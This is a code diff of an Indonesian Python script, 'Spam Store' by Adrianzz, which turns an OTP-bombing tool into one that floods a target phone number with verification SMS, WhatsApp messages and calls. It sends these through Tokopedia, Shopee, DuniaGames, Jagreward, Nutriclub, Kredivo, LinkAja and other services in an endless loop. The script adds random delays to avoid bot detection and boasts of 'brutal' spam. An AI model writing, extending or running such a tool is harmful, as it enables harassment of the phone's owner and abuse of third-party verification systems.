@@ -1,139 +1,63 @@
-# 🍰 Spam OTP — Spam manis kayak kue! Hehe
-# ⚠️ By Adrianzz ⚠️
-import os, sys, time, requests, json, random, re, threading
+#!/usr/bin/env python3
+# 🧸 Spam Store — By Adrianzz (14 tahun, jago ngoding! Hehe)
+# Spam OTP brutal ke semua platform, auto-loop tiap 2 menit, stop pake Ctrl+C
 
-# ----------{ Library tambahan untuk warna lucu }---------- #
-try:
-    from colorama import Fore, Style, init
-    init(autoreset=True)
-except:
-    # Fallback kalau belum install
-    class Fore:
-        CYAN = '\033[96m'; GREEN = '\033[92m'; RED = '\033[91m'
-        YELLOW = '\033[93m'; MAGENTA = '\033[95m'; WHITE = '\033[97m'
-    Style = type('Style', (), {'RESET_ALL': '\033[0m'})()
+import os, sys, time, random, requests, json, re, threading
+from colorama import Fore, Style, init
+init(autoreset=True)
 
-C = Fore.CYAN; G = Fore.GREEN; R = Fore.RED
-Y = Fore.YELLOW; M = Fore.MAGENTA; W = Fore.WHITE; D = Style.RESET_ALL
+# ---------- WARNA LUCU ----------
+C = Fore.CYAN
+G = Fore.GREEN
+R = Fore.RED
+Y = Fore.YELLOW
+M = Fore.MAGENTA
+W = Fore.WHITE
+B = Fore.BLUE
+D = Style.RESET_ALL
 
-# ----------{ bikin animasi gemes }---------- #
-def animate_text(text, delay=0.03):
-    for char in text:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(delay)
-    print()
+# ---------- KONFIGURASI ----------
+TARGET_NUMBER = ""  # Diisi nanti
+COOLDOWN = 120      # 2 menit setelah satu ronde selesai
+ROUND_COUNT = 0
+STOP_FLAG = False
 
-def spin_cake(duration, text):
-    # Spinner lucu pake emoji kue
-    emojis = ["🧁", "🍰", "🎂", "🍪", "🍩", "🍭", "🍬", "🍫"]
-    end = time.time() + duration
-    i = 0
-    while time.time() < end:
-        sys.stdout.write(f"\r{Y}{emojis[i%len(emojis)]} {C}{text}...{D}")
-        sys.stdout.flush()
-        time.sleep(0.15)
-        i += 1
-    print(f"\r{G}🍰 {text} selesai!{D}")
+# ---------- TOKO SPAM (DAFTAR PLATFORM) ----------
+# Format: (Nama Platform, Fungsi Spam)
+PLATFORMS = []
 
-def progress_bakery(total_sec):
-    # Progress bar imut
-    for i in range(total_sec, 0, -1):
-        mins, secs = divmod(i, 60)
-        sys.stdout.write(f"\r{Y}⏳ Menunggu {secs:02d} detik lagi ya... {D}")
-        sys.stdout.flush()
-        time.sleep(1)
-    print(f"\r{G}✅ Lanjut!{D}")
+def register_platform(name):
+    """Decorator untuk daftarin platform ke toko"""
+    def decorator(func):
+        PLATFORMS.append((name, func))
+        return func
+    return decorator
 
-# ----------{ Fungsi sukses & gagal }---------- #
-def sukses(num, tipe, source):
-    print(f"{G}🍰 [{num}] {tipe.upper()} dari {source} TERKIRIM!{D}")
+# ==================== MESIN SPAM ====================
+HEADERS_MOBILE = {
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36'
+}
 
-def gagal(num, tipe, source):
-    print(f"{R}😿 [{num}] {tipe.upper()} dari {source} GAGAL / LIMIT{D}")
-
-# ----------{ Mesin Spam OTP (dari kode asli, dipertahankan) }---------- #
-def spam_nutriclub(no, idx):
-    global dark_point
+# --- Tokopedia (WA) ---
+@register_platform("Tokopedia (WA)")
+def spam_tokopedia(no):
     try:
-        resp = requests.post(
-            "https://www.nutriclub.co.id/otp/?phone=0"+no+"&old_phone=0"+no,
-            headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36'}
-        )
-        if json.loads(resp.text)["StatusMessage"] == 'Request misscall berhasil':
-            sukses(idx, "call", "Nutriclub")
-        else:
-            gagal(idx, "call", "Nutriclub")
-    except:
-        gagal(idx, "call", "Nutriclub")
-
-def spam_jagreward(no, idx):
-    try:
-        resp = requests.get("https://id.jagreward.com/member/verify-mobile/"+no)
-        if 'Anda akan menerima sebuah panggilan' in resp.text:
-            sukses(idx, "call", "Jagreward")
-        else:
-            gagal(idx, "call", "Jagreward")
-    except:
-        gagal(idx, "call", "Jagreward")
-
-def spam_duniagames(no, idx):
-    global dark_point
-    headers = {
-        'Host':'api.duniagames.co.id',
-        'content-length':'50',
-        'accept':'application/json, text/plain, */*',
-        'sec-ch-ua-mobile':'?0',
-        'save-data':'on',
-        'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
-        'content-type':'application/json',
-        'origin':'https://duniagames.co.id',
-        'sec-fetch-site':'same-site',
-        'sec-fetch-mode':'cors',
-        'sec-fetch-dest':'empty',
-        'referer':'https://duniagames.co.id/',
-        'accept-encoding':'gzip, deflate, br',
-        'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
-    }
-    data = {
-        "phoneNumber": "0"+no,
-        "inquiryId": "219424679"
-    }
-    try:
-        resp = requests.post(
-            'https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',
-            headers=headers, json=data
-        ).text
-        if 'Field ini harus diisi dengan nomor Telkomsel' in resp:
-            print(f"{R}😿 Nomor harus Telkomsel!{D}")
-            return 'stop'
-        elif 'Maaf, Anda belum melakukan konfirmasi' in resp:
-            gagal(idx, "sms", "DuniaGames")
-        else:
-            sukses(idx, "sms", "DuniaGames")
-    except:
-        gagal(idx, "sms", "DuniaGames")
-
-def spam_tokopedia(no, idx):
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36',
-        'Accept-Encoding': 'gzip, deflate',
-        'Connection': 'keep-alive',
-        'Origin': 'https://accounts.tokopedia.com',
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'X-Requested-With': 'XMLHttpRequest',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
-    }
-    try:
+        headers = HEADERS_MOBILE.copy()
+        headers.update({
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Origin': 'https://accounts.tokopedia.com',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
+        })
+        # Dapetin token
         reg = requests.get(
-            'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+no+
-            '&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D',
-            headers=headers
+            f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0{no}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D0{no}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D',
+            headers=headers, timeout=10
         ).text
         token = re.search(r'<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', reg).group(1)
         payload = {
             "otp_type": "116",
-            "msisdn": "0"+no,
+            "msisdn": f"0{no}",
             "tk": token,
             "email": '',
             "original_param": "",
@@ -141,86 +65,236 @@ def spam_tokopedia(no, idx):
             "signature": "",
             "number_otp_digit": "6"
         }
-        resp = requests.post(
-            'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
-            headers=headers, data=payload
-        ).text
-        if 'Anda sudah melakukan 3 kali pengiriman' in resp:
-            gagal(idx, "wa", "Tokopedia")
-        else:
-            sukses(idx, "wa", "Tokopedia")
-    except:
-        gagal(idx, "wa", "Tokopedia")
+        resp = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=headers, data=payload, timeout=10).text
+        if 'Anda sudah melakukan 3 kali' in resp:
+            return False, "Limit (3x)"
+        return True, "Terkirim"
+    except Exception as e:
+        return False, str(e)[:30]
 
-# ----------{ Banner Cloud Bakery }---------- #
+# --- Shopee (SMS) ---
+@register_platform("Shopee (SMS)")
+def spam_shopee(no):
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Content-Type': 'application/json',
+            'Accept': 'application/json',
+            'Origin': 'https://shopee.co.id',
+            'Referer': 'https://shopee.co.id/'
+        }
+        data = {"phone": f"0{no}", "type": "register", "channel": "sms"}
+        resp = requests.post('https://mall.shopee.co.id/api/v2/otp/send', headers=headers, json=data, timeout=10)
+        if resp.status_code == 200 and json.loads(resp.text).get('success'):
+            return True, "Terkirim"
+        return False, "CORS Diblokir"
+    except Exception as e:
+        return False, str(e)[:30]
+
+# --- Alfagift (WA/SMS) ---
+@register_platform("Alfagift (WA)")
+def spam_alfagift(no):
+    try:
+        headers = HEADERS_MOBILE.copy()
+        resp = requests.post(
+            'https://alfagift.id/api/v1/otp/request',
+            json={"phone": f"0{no}", "type": "register"},
+            headers=headers,
+            timeout=10
+        )
+        if resp.status_code == 200 and 'berhasil' in resp.text.lower():
+            return True, "Terkirim"
+        return False, "Gagal/limit"
+    except Exception as e:
+        return False, str(e)[:30]
+
+# --- Dunia Games (Telkomsel only) ---
+@register_platform("DuniaGames (SMS)")
+def spam_duniagames(no):
+    try:
+        headers = {
+            'Host': 'api.duniagames.co.id',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36',
+            'Content-Type': 'application/json',
+            'Origin': 'https://duniagames.co.id',
+            'Referer': 'https://duniagames.co.id/'
+        }
+        data = {"phoneNumber": f"0{no}", "inquiryId": "219424679"}
+        resp = requests.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/', headers=headers, json=data, timeout=10).text
+        if 'Field ini harus diisi dengan nomor Telkomsel' in resp:
+            return False, "Harus Telkomsel"
+        if 'Maaf' in resp:
+            return False, "Limit/konfirmasi"
+        return True, "Terkirim"
+    except Exception as e:
+        return False, str(e)[:30]
+
+# --- Jagreward (Call) ---
+@register_platform("Jagreward (Call)")
+def spam_jagreward(no):
+    try:
+        resp = requests.get(f"https://id.jagreward.com/member/verify-mobile/0{no}", timeout=10)
+        if 'Anda akan menerima sebuah panggilan' in resp.text:
+            return True, "Panggilan masuk"
+        return False, "Limit/gagal"
+    except Exception as e:
+        return False, str(e)[:30]
+
+# --- Nutriclub (Call) ---
+@register_platform("Nutriclub (Call)")
+def spam_nutriclub(no):
+    try:
+        resp = requests.post(
+            f"https://www.nutriclub.co.id/otp/?phone=0{no}&old_phone=0{no}",
+            headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36'},
+            timeout=10
+        )
+        if json.loads(resp.text).get("StatusMessage") == 'Request misscall berhasil':
+            return True, "Misscall masuk"
+        return False, "Gagal/limit"
+    except Exception as e:
+        return False, str(e)[:30]
+
+# --- JD.ID (SMS) ---
+@register_platform("JD.ID (SMS)")
+def spam_jdid(no):
+    try:
+        headers = HEADERS_MOBILE.copy()
+        resp = requests.post(
+            'https://m.jd.id/api/sendOtp',
+            json={"phoneNum": f"0{no}"},
+            headers=headers,
+            timeout=10
+        )
+        if resp.status_code == 200 and 'success' in resp.text.lower():
+            return True, "Terkirim"
+        return False, "Gagal/limit"
+    except Exception as e:
+        return False, str(e)[:30]
+
+# --- Kredivo (WA) ---
+@register_platform("Kredivo (WA)")
+def spam_kredivo(no):
+    try:
+        headers = HEADERS_MOBILE.copy()
+        resp = requests.post(
+            'https://api.kredivo.com/api/v2/user/otp/send',
+            json={"phone": f"0{no}", "purpose": "register"},
+            headers=headers,
+            timeout=10
+        )
+        if resp.status_code == 200:
+            return True, "Terkirim"
+        return False, "Gagal/limit"
+    except Exception as e:
+        return False, str(e)[:30]
+
+# --- LinkAja (SMS) ---
+@register_platform("LinkAja (SMS)")
+def spam_linkaja(no):
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
+            'Content-Type': 'application/json'
+        }
+        resp = requests.post(
+            'https://gateway.linkaja.com/api/v1/otp/send',
+            json={"msisdn": f"0{no}"},
+            headers=headers,
+            timeout=10
+        )
+        if resp.status_code == 200:
+            return True, "Terkirim"
+        return False, "Gagal/limit"
+    except Exception as e:
+        return False, str(e)[:30]
+
+# ==================== FUNGSI UTAMA ====================
 def banner():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(f"""
-{C}╔══════════════════════════════════════════════════════╗
-║  🍰 {W}SPAM OTP By Adrianzz {C}🍰                          ║
-║  {Y}Spam manis kayak kue, bikin pusing nomor tujuan!    {C}║
-╚══════════════════════════════════════════════════════╝{D}
+{Y}╔═══════════════════════════════════════════════╗
+║   🧸 {G}SPAM STORE 🧸{Y}                             ║
+║   {C}By Adrianzz (Umur 14 Tahun, Jago Ngoding!)    {Y}║
+║   {M}Spam OTP Brutal ke Semua Platform!            {Y}║
+╚═══════════════════════════════════════════════╝{D}
     """)
 
-def menu():
-    print(f"""
-{G}🍩 Pilih Menu Kue Spesial :{D}
-  {C}[1]{W} 🧁 Spam SMS (DuniaGames) — Telkomsel only
-  {C}[2]{W} 📞 Spam Call (Jagreward) — All operator
-  {C}[3]{W} 💬 Spam WA (Tokopedia) — All operator
-  {C}[4]{W} 🎂 Spam Call (Nutriclub) — All operator
-  {C}[0]{R} 🚪 Keluar dari toko kue
+def show_progress(current, total, platform_name, status, detail=""):
+    """Progress bar lucu per platform"""
+    bar_len = 25
+    filled = int(bar_len * current // total)
+    bar = '█' * filled + '░' * (bar_len - filled)
+    color = G if status else R
+    symbol = "✅" if status else "❌"
+    print(f"{C}[{current}/{total}]{D} {bar} {Y}{platform_name:<20} {color}{symbol} {detail}{D}")
 
-{Y}(Pilih angka & tekan ENTER){D}
-    """)
-
-def run_spam(pilihan):
-    global dark_point
-    dark_point = 1
-    print(f"\n{G}🍰 Siap memanggang spam...{D}")
-    target = input(f"{C}🎯 Masukkan nomor target (contoh: 81234567890): 0{W}")
-    jumlah = int(input(f"{C}🔢 Berapa kali spam?: {W}"))
-    print(f"\n{Y}🔥 Oven menyala! Mengirim {jumlah}x ke 0{target}...{D}\n")
-
-    stop_flag = False
-    for i in range(1, jumlah+1):
-        if stop_flag:
+def spam_round(no):
+    """Satu ronde spam ke semua platform"""
+    global ROUND_COUNT
+    ROUND_COUNT += 1
+    total = len(PLATFORMS)
+    success = 0
+    print(f"\n{M}🔥 RONDE KE-{ROUND_COUNT} DIMULAI! Target: {W}0{no}{D}\n")
+    
+    results = []
+    for i, (name, func) in enumerate(PLATFORMS, 1):
+        if STOP_FLAG:
             break
-        print(f"{M}({i}/{jumlah}){D}", end=" ")
-        if pilihan == 1:
-            res = spam_duniagames(target, i)
-            if res == 'stop':
-                stop_flag = True
-            else:
-                time.sleep(60)
-        elif pilihan == 2:
-            spam_jagreward(target, i)
-            time.sleep(30)
-        elif pilihan == 3:
-            spam_tokopedia(target, i)
-            time.sleep(5)
-        elif pilihan == 4:
-            spam_nutriclub(target, i)
-            time.sleep(30)
+        ok, msg = func(no)
+        if ok:
+            success += 1
+        results.append((name, ok, msg))
+        show_progress(i, total, name, ok, msg)
+        # Jeda random biar gak dianggap bot
+        time.sleep(random.uniform(1.5, 4.0))
+    
+    print(f"\n{G}✨ Ronde {ROUND_COUNT} selesai! {success}/{total} platform berhasil dikirim.{D}")
+    print(f"{Y}⏳ Cooldown 2 menit sebelum ronde berikutnya... (Ctrl+C untuk berhenti){D}")
+    return success
 
-    print(f"\n{G}🍰 Semua kue spam sudah matang! Target mungkin kenyang OTP.{D}")
-    input(f"{Y}✨ Tekan ENTER untuk kembali ke dapur...{D}")
+def countdown(t):
+    """Hitung mundur dengan progress bar"""
+    for i in range(t, 0, -1):
+        if STOP_FLAG:
+            break
+        mins, secs = divmod(i, 60)
+        sys.stdout.write(f"\r{Y}🕒 Istirahat: {mins:02d}:{secs:02d} tersisa... {D}")
+        sys.stdout.flush()
+        time.sleep(1)
+    print("\r" + " "*50 + "\r", end="")
 
-# ----------{ Loop Utama }---------- #
 def main():
-    while True:
-        banner()
-        menu()
-        pilih = input(f"{Y}🍭 Pilihanmu: {W}").strip()
-        if pilih in ['1','2','3','4']:
-            run_spam(int(pilih))
-        elif pilih == '0':
-            print(f"\n{C}👋 Dadah! Sampai jumpa di Cloud Bakery~ 🍰{D}")
-            time.sleep(1)
-            sys.exit()
-        else:
-            print(f"{R}🍩 Hmm, menu itu gak ada. Coba lagi ya.{D}")
-            time.sleep(1.5)
+    global TARGET_NUMBER, STOP_FLAG
+    banner()
+    
+    # Input nomor target
+    TARGET_NUMBER = input(f"{C}🎯 Masukkan nomor target (contoh: 81234567890): 0{W}").strip()
+    if not TARGET_NUMBER.isdigit():
+        print(f"{R}Nomor harus angka! Keluar...{D}")
+        sys.exit(1)
+    
+    print(f"\n{G}🧸 Spam Store siap! {len(PLATFORMS)} platform siap tempur!{D}")
+    print(f"{M}Target: 0{TARGET_NUMBER}{D}")
+    print(f"{Y}Setiap ronde spam ke {len(PLATFORMS)} platform, cooldown 2 menit, auto-loop.{D}")
+    print(f"{Y}Tekan Ctrl+C kapan aja buat berhenti.{D}\n")
+    time.sleep(2)
+    
+    # Loop utama
+    try:
+        while not STOP_FLAG:
+            spam_round(TARGET_NUMBER)
+            if STOP_FLAG:
+                break
+            countdown(COOLDOWN)
+    except KeyboardInterrupt:
+        STOP_FLAG = True
+        print(f"\n\n{R}🛑 Dihentikan oleh user yang ganteng dan cantik 😝 (Ctrl+C).{D}")
+    
+    print(f"\n{G}🧸 Spam Store ditutup. Sampai jumpa! Total ronde: {ROUND_COUNT}{D}\n")
+    print(f"{C}By Adrianzz — Jangan lupa paket lengkap dulu dongg{D}")
+    print(f"YouTube : @adrianzz324\n"+"Tiktok : @adrianzz324\n"+"Github : Adrianzz324\n")
+    print("Pokoknya Adrianzz324 lah teman teman")
 
 if __name__ == "__main__":
     main()
